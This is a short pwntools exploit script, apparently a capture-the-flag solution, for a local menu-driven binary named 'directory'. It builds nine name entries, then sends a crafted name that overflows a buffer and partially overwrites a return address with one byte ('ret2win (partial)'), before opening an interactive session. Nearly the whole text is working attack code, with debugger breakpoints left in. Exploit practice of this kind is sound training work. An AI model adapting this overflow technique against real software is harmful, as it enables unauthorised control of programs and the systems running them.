from pwn import *

script = '''
b *process_menu
b *process_menu + 758
'''

def add_name(name):
	p.sendlineafter(b"> ", b"1")
	p.sendafter(b"name: ", name)

def remove_name(index):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"index: ", f"{index}".encode())

def print_name():
	p.sendlineafter(b"> ", b"3")

#p = gdb.debug("./directory", gdbscript = script)
p = process("./directory")

for i in range(9):
	add_name(p8(i) * 0x30)

# ret2win (partial)
add_name(b"A" * 0x20 + p64(0) + p8(0x38))

p.sendlineafter(b"> ", b"4")	

p.interactive()